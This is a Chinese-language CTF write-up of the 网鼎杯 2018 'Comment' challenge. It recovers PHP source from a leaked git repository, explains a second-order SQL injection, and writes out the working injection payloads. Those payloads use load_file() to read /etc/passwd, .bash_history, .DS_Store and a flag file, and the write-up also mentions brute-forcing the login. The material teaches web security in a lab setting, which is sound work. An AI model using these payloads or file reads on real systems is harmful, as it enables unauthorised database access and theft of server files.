[TOC]



## [网鼎杯 2018]Comment

进去发现一个留言板，测试了一下好像没什么东西

![image-20230514131240742](https://s2.loli.net/2023/05/14/XIvKMilZVmdCjcJ.png)



然后目录扫描一下，发现了git泄露，用`GitHack`获取

![image-20230514131418239](https://s2.loli.net/2023/05/14/GoM1D9A8zbJgBas.png)



发现没什么东西，然后我们使用 `git log --all`查看所有分支的git提交记录：

![image-20230514131506750](https://s2.loli.net/2023/05/14/sKbl7eNoX5HBFVv.png)



切换到第一个：

```
git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c
```

获取到完整php文件内容：

write_do.php

```php
<?php
include "mysql.php";
session_start();
if($_SESSION['login'] != 'yes'){
    header("Location: ./login.php");
    die();
}
if(isset($_GET['do'])){
switch ($_GET['do'])
{
case 'write':
    $category = addslashes($_POST['category']);
    $title = addslashes($_POST['title']);
    $content = addslashes($_POST['content']);
    $sql = "insert into board
            set category = '$category',
                title = '$title',
                content = '$content'";
    $result = mysql_query($sql);
    header("Location: ./index.php");
    break;
case 'comment':
    $bo_id = addslashes($_POST['bo_id']);
    $sql = "select category from board where id='$bo_id'";
    $result = mysql_query($sql);
    $num = mysql_num_rows($result);
    if($num>0){
    $category = mysql_fetch_array($result)['category'];
    $content = addslashes($_POST['content']);
    $sql = "insert into comment
            set category = '$category',
                content = '$content',
                bo_id = '$bo_id'";
    $result = mysql_query($sql);
    }
    header("Location: ./comment.php?id=$bo_id");
    break;
default:
    header("Location: ./index.php");
}
}
else{
    header("Location: ./index.php");
}
?>
```

仔细分析一下，发现 `category`变量存在二次注入



```php
case 'write':
    $category = addslashes($_POST['category']);
	...

case 'comment':
    $bo_id = addslashes($_POST['bo_id']);
    $sql = "select category from board where id='$bo_id'";
    $result = mysql_query($sql);
    $num = mysql_num_rows($result);
    if($num>0){
    $category = mysql_fetch_array($result)['category'];
    $content = addslashes($_POST['content']);
    $sql = "insert into comment
            set category = '$category',
                content = '$content',
                bo_id = '$bo_id'";
```

在`write`写的时候，使用了`addslashes()`函数，会将单引号 `'`、双引号`"`、反斜杠 `\`等 加上一个反斜杠转义

然后`comment`中取出 `category`，但是没有进行转义，这就造成了二次注入漏洞

```sql
$sql = "select category from board where id='$bo_id'";
...
$category = mysql_fetch_array($result)['category'];
```

但是在`write`中使用 `addslashes()`后，**存入数据库时并不会将转义后添加的`\`存入数据库中**



于是我们先在`write`中写入：

```
',content=user(),/*
```

<img src="https://s2.loli.net/2023/05/14/LyisATHFCwo8mvj.png" alt="image-20230514132606523" style="zoom:50%;" />







但是提示我们需要登录，直接爆破一下，密码加上666

然后在`comment`中为`content`赋值：

```
content=*/#&bo_id=14
```

这是什么意思呢？

```sql
$category = mysql_fetch_array($result)['category'];
$content = addslashes($_POST['content']);
$sql = "insert into comment
            set category = '$category',
                content = '$content',
                bo_id = '$bo_id'";
```

将category取出，然后再为content赋值，代码变成了这样：

```sql
$sql = "insert into comment
            set category = '',content=user(),/*',
                content = '*/#',
                bo_id = '$bo_id'";
```

这里我们恰好注释掉了 `content`，将其设置为自定义的。

/**/可以多行注释。#只能单行注释，注释掉了后面的 `',`

![image-20230514133313615](https://s2.loli.net/2023/05/14/ul1EFGvyRDQkrL2.png)



查询出来了root权限。

然后继续查库名、表名。。发现查询不到flag



由于此处是 root权限，可以使用 `load_file()`函数读取文件，我们读取一下 `/etc/passwd`

```
category=',content=load_file("/etc/passwd"),/*
```



> `/etc/passwd` 是一个文件，它记录了系统上的用户账号信息。每行记录表示一个用户账号，每行记录包含了如下字段：
>
> ```
> username:password:UID:GID:GECOS:home_directory:login_shell
> ```
>
> - `username`：用户登录名
> - `password`：加密后的用户密码，现在一般为 "x"，表示密码存储在 `/etc/shadow` 文件中
> - `UID`：用户ID，是一个整数值，用来唯一标识该用户
> - `GID`：用户所属的组ID
> - `GECOS`：用户的全名或注释信息
> - `home_directory`：用户的主目录
> - `login_shell`：用户登录后使用的默认shell程序
>
> 例如，下面是一个 `/etc/passwd` 文件的示例：
>
> ```
> root:x:0:0:root:/root:/bin/bash
> daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
> bin:x:2:2:bin:/bin:/usr/sbin/nologin
> ```
>
> 可以使用 `cat` 命令来查看 `/etc/passwd` 文件的内容，例如：
>
> ```
> cat /etc/passwd
> ```



![image-20230514133819724](https://s2.loli.net/2023/05/14/VaT2O47HDyoqlrA.png)



这里我们发现 `www`用户的**用户主目录刚好为 `/home`**

这个目录下有一个神奇的文件：`.bash_history`

> `.bash_history` 是一个隐藏文件，它**保存了用户在命令行界面中输入的历史命令记录**。当用户退出当前命令行终端时，系统会将当前的历史命令保存到 `.bash_history` 文件中，下次用户登录时，可以使用方向键等功能浏览并调用之前输入过的命令。
>
> **`.bash_history` 文件通常位于用户的主目录**下，可以使用以下命令来查看该文件的内容：
>
> ```
> cat ~/.bash_history
> ```
>
> 也可以使用其他文本编辑器，如 `vi`、`nano` 等编辑器来查看和编辑该文件，例如：
>
> ```
> vi ~/.bash_history
> ```
>
> 需要注意的是，`.bash_history` 文件中包含了用户输入的所有命令记录，包括敏感信息，因此需要妥善保管。为了保护用户的隐私，可以使用 `history` 命令来清除或删除历史命令记录，也可以在用户的 `~/.bashrc` 文件中设置不记录历史命令等操作。

我们查看一下：

```
',content=load_file("/home/www/.bash_history"),/*
```

得到：

```
cd /tmp/
unzip html.zip
rm -f html.zip
cp -r html /var/www/
cd /var/www/html/
rm -f .DS_Store
service apache2 start
```

这一些指令的意思是：

解压 `/tmp`下的 `html.zip`压缩包，然后删除这个压缩包，复制`html`目录到 `/var/www/html`下，删除该目录的 `.DS_Store`文件

> `.DS_Store` 是一个隐藏文件，它通常出现在 Mac OS 系统中，用于存储某个目录的自定义显示属性，例如图标位置、背景色等。在打开一个包含 `.DS_Store` 文件的文件夹时，系统会根据该文件中保存的自定义属性来展示文件夹的显示效果。
>
> `.DS_Store` 文件是由 Finder 应用程序自动生成和维护的，它存储了目录的各种视觉和结构属性，如文件的位置、大小、图标等。该文件默认是隐藏的，因此在正常使用的情况下，用户无法看到它。但在一些情况下，例如将一个 Mac 上的文件夹复制到其他系统或者网络共享中时，`.DS_Store` 文件可能会成为一个问题。
>
> 如果不希望 `.DS_Store` 文件在复制或共享时被包含在内，可以通过以下方法来禁用它的生成：
>
> 1. 在命令行中使用如下命令：
>
>    ```
>    defaults write com.apple.desktopservices DSDontWriteNetworkStores true
>    ```
>    
>    该命令会禁用在网络共享中生成 `.DS_Store` 文件。
>    
> 2. 在命令行中使用如下命令：
>
>    ```
>    defaults write com.apple.finder CreateDesktop false
>    ```
>    
>    该命令会禁用在本地目录中生成 `.DS_Store` 文件。
>    
>
> 需要注意的是，禁用 `.DS_Store` 文件可能会影响到 Finder 的显示效果，因此建议在操作前备份好数据，并在需要时重新启用该文件。

`.DS_Store`文件存储了`html`目录的一些属性。

这里注意的是，虽然删除了该目录的该文件，但是 `/tmp/html`目录下没有删除，

我们获取一下该文件：

```
',content=hex(load_file("/tmp/html/.DS_Store")),/*
```

这里使用hex编码，防止不可见字符，然后转为字符串：



![image-20230514135523267](https://s2.loli.net/2023/05/14/X2Zbgrxp83BFPYq.png)



发现php文件，读取：

```
',content=hex(load_file("/tmp/html/flag_8946e1ff1ee3e40f.php")),/*
```

是个假的，读`/var/www/html`目录下的：

```
',content=hex(load_file("/var/www/html/flag_8946e1ff1ee3e40f.php")),/*
```

